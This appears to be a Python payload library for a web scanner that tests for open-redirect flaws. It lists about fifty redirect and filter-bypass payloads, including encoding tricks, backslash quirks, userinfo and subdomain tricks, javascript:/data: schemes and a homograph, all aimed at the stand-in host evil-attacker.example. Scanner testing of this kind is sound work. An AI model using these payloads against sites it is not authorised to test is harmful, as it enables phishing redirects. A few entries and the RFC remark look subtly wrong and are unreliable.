"""open_redirect payload library — generated dev-time by Claude.

Each entry has a payload + a category. Confirmation is done by the
scanner: the response's Location header must resolve to the attacker
host (host-verified, not substring-match).

Categories:
  absolute       — Plain https://attacker.com/
  schemeless     — //attacker.com (most common in real apps)
  backslash      — \\\\attacker.com / /\\attacker.com (browser quirk)
  userinfo       — https://target.com@attacker.com
  subdomain      — https://target.com.attacker.com (DNS trick)
  url-encoded    — Single URL-encoding tricks
  double-encoded — Double URL-encoding (//→%252f%252f)
  whitespace     — Leading whitespace / tab / newline (RFC-3986 leniency)
  null-byte      — %00 injection
  scheme-bypass  — javascript: / data: / vbscript: variants
  fragment       — #-prefix forcing fragment treated as host by quirky parser
  unicode        — Punycode / IDN homograph
  protocol-rel   — Protocol-relative obfuscations
"""

_ATTACKER = "evil-attacker.example"

OPEN_REDIRECT_PAYLOADS = [
  # ── Absolute URL ──
  {"payload": f"https://{_ATTACKER}",        "category": "absolute"},
  {"payload": f"http://{_ATTACKER}",         "category": "absolute"},
  {"payload": f"https://{_ATTACKER}/",       "category": "absolute"},
  {"payload": f"https://{_ATTACKER}/path",   "category": "absolute"},
  {"payload": f"https://{_ATTACKER}/?q=1",   "category": "absolute"},

  # ── Schemeless //host ──
  {"payload": f"//{_ATTACKER}",              "category": "schemeless"},
  {"payload": f"//{_ATTACKER}/",             "category": "schemeless"},
  {"payload": f"//{_ATTACKER}/path",         "category": "schemeless"},
  {"payload": f"//{_ATTACKER}#",             "category": "schemeless"},
  {"payload": f"////{_ATTACKER}",            "category": "schemeless"},

  # ── Backslash quirks (browsers normalize \\ → //) ──
  {"payload": f"/\\{_ATTACKER}",             "category": "backslash"},
  {"payload": f"\\\\{_ATTACKER}",            "category": "backslash"},
  {"payload": f"/\\/{_ATTACKER}",            "category": "backslash"},
  {"payload": f"\\/\\/{_ATTACKER}",          "category": "backslash"},

  # ── User-info bypass (https://target.com@attacker.com) ──
  {"payload": f"https://target.com@{_ATTACKER}",   "category": "userinfo"},
  {"payload": f"https://example.com@{_ATTACKER}",  "category": "userinfo"},
  {"payload": f"//target.com@{_ATTACKER}",         "category": "userinfo"},
  {"payload": f"https://user:pass@{_ATTACKER}",    "category": "userinfo"},

  # ── Subdomain trick (https://target.com.attacker.com) ──
  {"payload": f"https://target.com.{_ATTACKER}",   "category": "subdomain"},
  {"payload": f"https://example.com.{_ATTACKER}",  "category": "subdomain"},
  {"payload": f"//target.com.{_ATTACKER}",         "category": "subdomain"},

  # ── URL-encoded ──
  {"payload": f"https:%2f%2f{_ATTACKER}",          "category": "url-encoded"},
  {"payload": f"%2f%2f{_ATTACKER}",                "category": "url-encoded"},
  {"payload": f"%2F%2F{_ATTACKER}%2F",             "category": "url-encoded"},
  {"payload": f"https:%5C%5C{_ATTACKER}",          "category": "url-encoded"},
  {"payload": f"%5c%5c{_ATTACKER}",                "category": "url-encoded"},

  # ── Double URL-encoded ──
  {"payload": f"https:%252f%252f{_ATTACKER}",      "category": "double-encoded"},
  {"payload": f"%252f%252f{_ATTACKER}",            "category": "double-encoded"},
  {"payload": f"%25252f%25252f{_ATTACKER}",        "category": "double-encoded"},

  # ── Whitespace prefix (RFC-3986 §3.1 allows trim by some parsers) ──
  {"payload": f" //{_ATTACKER}",                   "category": "whitespace"},
  {"payload": f"\t//{_ATTACKER}",                  "category": "whitespace"},
  {"payload": f"\n//{_ATTACKER}",                  "category": "whitespace"},
  {"payload": f"%09//{_ATTACKER}",                 "category": "whitespace"},
  {"payload": f"%0a//{_ATTACKER}",                 "category": "whitespace"},
  {"payload": f"%0d//{_ATTACKER}",                 "category": "whitespace"},
  {"payload": f"%20//{_ATTACKER}",                 "category": "whitespace"},

  # ── Null-byte injection ──
  {"payload": f"https://{_ATTACKER}%00.target.com", "category": "null-byte"},
  {"payload": f"//{_ATTACKER}%00",                  "category": "null-byte"},

  # ── Scheme-bypass (javascript: / data:) — XSS-adjacent ──
  {"payload": f"javascript://target.com/%0aalert(1)//{_ATTACKER}", "category": "scheme-bypass"},
  {"payload": f"data:text/html,<script>location='https://{_ATTACKER}'</script>", "category": "scheme-bypass"},

  # ── Fragment-prefix (quirky parser) ──
  {"payload": f"#https://{_ATTACKER}",             "category": "fragment"},
  {"payload": f"?next=https://{_ATTACKER}",        "category": "fragment"},

  # ── Punycode / IDN homograph ──
  {"payload": f"https://xn--{_ATTACKER}",          "category": "unicode"},
  {"payload": f"https://tаrget.com",               "category": "unicode"},  # Cyrillic 'а'

  # ── Protocol-relative obfuscations ──
  {"payload": f"////{_ATTACKER}/path",             "category": "protocol-rel"},
  {"payload": f"/%2f{_ATTACKER}",                  "category": "protocol-rel"},
  {"payload": f"/\\\\{_ATTACKER}",                 "category": "protocol-rel"},
  {"payload": f"%09//{_ATTACKER}/",                "category": "protocol-rel"},

  # ── Bare host (some apps prepend http://) ──
  {"payload": _ATTACKER,                           "category": "absolute"},
  {"payload": f"{_ATTACKER}/path",                 "category": "absolute"},
]

ATTACKER_HOST = _ATTACKER
